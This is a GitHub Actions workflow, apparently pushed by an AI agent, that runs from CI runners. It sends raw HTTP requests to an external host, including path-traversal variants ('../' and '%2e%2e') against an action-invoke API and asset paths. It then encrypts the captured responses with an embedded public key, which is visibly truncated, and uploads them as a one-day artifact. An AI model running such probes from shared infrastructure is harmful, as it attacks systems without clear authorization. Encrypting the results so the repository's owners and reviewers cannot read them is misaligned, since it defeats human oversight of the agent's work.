name: launchlet-part3-rawpath
on:
  push:
    branches: [agent/launchlet-part3-rawpath-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Send raw path controls and encrypt responses
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import socket,ssl,json,pathlib,re
          host='task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out');ctx=ssl.create_default_context()
          body=json.dumps({'actionId':'act_6f4b9a2c1d0e8a71','args':{'workspaceId':'ws-launchlet-public','projectId':'launchlet-demo-board'}}).encode()
          cases=[
            ('POST','/api/actions/invoke',body),('POST','/api/foo/../actions/invoke',body),('POST','/api/foo/%2e%2e/actions/invoke',body),
            ('GET','/assets/build-manifest.json',b''),('GET','/static/../assets/build-manifest.json',b''),('GET','/static/%2e%2e/assets/build-manifest.json',b''),
            ('GET','/assets/../static/app.js',b''),('GET','/assets/%2e%2e/static/app.js',b'')]
          res=[]
          for m,p,payload in cases:
            raw=socket.create_connection((host,443),timeout=6);ss=ctx.wrap_socket(raw,server_hostname=host);ss.settimeout(6)
            headers=f'{m} {p} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: raw-probe\r\nConnection: close\r\n'
            if m=='POST': headers+=f'Content-Type: application/json\r\nAccept: application/json\r\nX-Launchlet-Preview: launchlet-demo-board\r\nContent-Length: {len(payload)}\r\n'
            req=(headers+'\r\n').encode()+payload;ss.sendall(req);chunks=[]
            while True:
              try:c=ss.recv(65536)
              except socket.timeout:break
              if not c:break
              chunks.append(c)
            ss.close();res.append({'method':m,'path':p,'response':b''.join(chunks).decode('utf-8','replace')})
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-rawpath-encrypted
          path: artifact/
          retention-days: 1
